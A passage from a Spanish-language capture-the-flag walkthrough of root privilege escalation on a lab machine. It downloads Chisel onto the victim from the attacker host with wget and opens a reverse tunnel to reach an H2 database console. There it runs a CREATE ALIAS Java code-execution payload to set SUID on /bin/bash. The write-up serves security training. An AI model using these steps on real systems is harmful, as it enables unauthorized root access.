## Escalada de privilegios {-}

### Rootear la maquina {-}

Algo que hemos visto, es que el puerto **8082** no se podia ver por reglas definidas en el sistema.
Como ya hemos pensado en tecnicas de port forwarding, instalamos **Chisel**.

1. Descarga de chisel y build

    ```bash
    git clone https://github.com/jpillora/chisel
    cd chisel
    go build -ldflags "-w -s" .
    upx chisel
    chmod +x chisel
    ```

1. Enviamos chisel a la maquina victima

    - en la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        cd /tmp
        wget http://10.10.14.8/chisel
        chmod +x chisel
        ```

1. En la maquina de atacante creamos un servidor 

    ```bash
    ./chisel server --reverse --port 1234
    ```

1. En la maquina victima creamos un cliente 

    ```bash
    ./chisel client 10.10.14.8:1234 R:8082:127.0.0.1:8082
    ```

Ahora en firefox si vamos a la url `http://localhost:8082` ya podemos ver el contenido de la web.

Si pinchamos en preferencias y despues en **Permitir conexiones desde otros ordenadores** ya podemos navegar desde la
url `http://10.10.10.102:8082`.

Aqui vemos un mensaje Wrong user name or password. Esto puede passar si la **URL JDBC** ya esta en uso. 
si cambiamos la url `jdbc:h2:~/test` por `jdbc:h2:~/EEEEEE` y pinchamos el boton conectar, Entramos en el
panel de control H2 database.

Si en la shell buscamos con el commando `ps -faux` y buscamos el servicio **h2** vemos que el servicio a sido lanzado por
el usuario root. Quiere decir que si ejecutamos commandos desde la consola h2, lo lanzariamos como usuario root.

Buscamos si existe un exploit para H2 console

```bash
searchsploit h2 consola
searchsploit h2 database
```

Encontramos un exploit en python que permitiria ejecutar **Alias Arbitrary Code execution**. Lo analizamos:

```bash
searchsploit -x 44422
```

Mirando el exploit, vemos que tenemos que crear un alias en el cual podemos podemos utilizar para ejecutar commandos. En este caso
no necessitamos utilizar el exploit. Podemos copiar las partes que nos interessa en el panel H2.

```sql
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new \
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;

CALL EXECVE('whoami')
```

Aqui vemos **root**. Pues aqui lanzamos el commando para que la `/bin/bash` sea SUID

```sql
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new \
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;

CALL EXECVE('chmod 4755 /bin/bash')
```

En la shell, ya podemos comprobar que la `/bin/bash` es SUID y con el commando `bash -p` no convertimos en root

```bash
ls -l /bin/bash
bash -p
cd /root
cat root.txt
```

Y a estamos root y podemos visualizar la flag.
